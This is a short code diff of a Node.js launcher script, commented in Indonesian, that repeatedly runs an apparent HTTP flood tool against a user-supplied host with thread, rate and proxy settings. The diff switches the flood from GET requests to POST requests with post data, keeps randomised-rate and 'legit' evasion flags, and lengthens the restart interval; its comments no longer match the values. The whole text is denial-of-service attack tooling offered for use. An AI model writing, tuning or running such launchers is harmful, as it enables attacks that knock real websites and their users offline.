@@ -8,7 +8,7 @@ if (args.length < 5) {
 
 const [host, time, thread, rate, proxy] = args;
 let elapsedTime = 0; 
-const restartInterval = 35; // Restart setiap 60 detik
+const restartInterval = 1000; // Restart setiap 60 detik
 const restartDelay = 0; // Jeda 1 detik sebelum memulai ulang
 
 function runScript() {
@@ -28,7 +28,7 @@ function runScript() {
 
     // Tunggu 1 detik sebelum memulai ulang
     setTimeout(() => {
-        const process = exec(`node /root/methods/HTTP-COSTUM GET ${host} ${restartInterval} ${rate} ${thread} ${proxy} --full --randrate --query 2 --legit`);
+        const process = exec(`node /root/methods/HTTP-COSTUM POST "${host}" ${restartInterval} ${rate} ${thread} ${proxy} --postdata "id=123&action=submit" --full --randrate --legit`);
 
         process.stdout.on("data", (data) => console.log(data.toString()));
         process.stderr.on("data", (data) => console.error(data.toString()));
